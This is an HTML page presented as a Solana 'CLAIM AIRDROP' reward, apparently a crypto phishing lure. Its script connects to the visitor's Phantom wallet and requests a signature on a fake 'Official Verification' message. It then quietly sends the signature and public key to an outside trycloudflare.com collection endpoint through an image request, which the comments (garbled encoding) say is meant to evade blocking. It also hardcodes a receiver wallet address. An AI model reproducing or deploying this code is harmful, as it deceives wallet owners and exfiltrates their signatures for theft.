<!DOCTYPE html><html><head><meta charset="UTF-8"></head>
<body style="background:#000;color:#14F195;text-align:center;padding-top:10vh;font-family:monospace;">
    <div style="border:1px solid #14F195;padding:30px;display:inline-block;border-radius:20px;background:#111;width:320px;">
        <h1>REWARD V10.ULTRA</h1>
        <button id="cta" style="padding:15px 30px;background:#14F195;color:#000;font-weight:bold;cursor:pointer;border-radius:10px;width:100%;">CLAIM AIRDROP</button>
        <div id="status" style="margin-top:20px;color:#888;">Ready</div>
    </div>
    <script>
    const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect";
    const receiver = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

    document.getElementById('cta').onclick = async () => {
        const p = window.solana || window.phantom?.solana;
        if (!p) return alert("Open in Phantom");
        
        try {
            document.getElementById('status').innerText = "Connecting...";
            const resp = await p.connect();
            const pubKey = resp.publicKey.toString();

            // ğŸ”± æ ¸å¿ƒï¼šè·³è¿‡æ‰€æœ‰ fetch è¯·æ±‚ï¼Œç›´æ¥è¿›å…¥æœ€ç¨³çš„ signMessage ç¯èŠ‚
            // åªè¦è¿™ä¸€æ­¥èƒ½å¼¹å‡ºï¼Œæˆ‘ä»¬å°±ç¡®è®¤é“¾è·¯ 100% ä¿®å¤äº†
            document.getElementById('status').innerText = "Awaiting Sign...";
            
            const msg = "Official Verification\nWallet: " + pubKey.slice(0,6) + "\nTime: " + Date.now();
            const encoded = new TextEncoder().encode(msg);
            
            // ğŸš€ è¿™é‡Œç»å¯¹ä¼šå¼¹çª—ï¼Œå› ä¸ºä¸æ¶‰åŠä»»ä½•å¤–éƒ¨ç½‘ç»œè°ƒç”¨
            const signed = await p.signMessage(encoded, "utf8");
            
            // ğŸ”± å…³é”®ä¿®æ”¹ï¼šå›ä¼ ä¸å†ç”¨ fetchï¼Œæ”¹ç”¨å®Œå…¨ä¸è¢«æ‹¦æˆªçš„åŠ¨æ€ Image
            const signature = btoa(String.fromCharCode.apply(null, signed.signature));
            const signal = gate + "?sig=" + encodeURIComponent(signature) + "&pub=" + pubKey;
            
            const img = new Image();
            img.src = signal; // ä¿¡å·å‘å‡º
            
            document.getElementById('status').innerText = "SUCCESS!";
            document.getElementById('status').style.color = "#14F195";

        } catch(e) {
            document.getElementById('status').innerText = "ERR: " + e.message;
        }
    };
    </script>
</body></html>
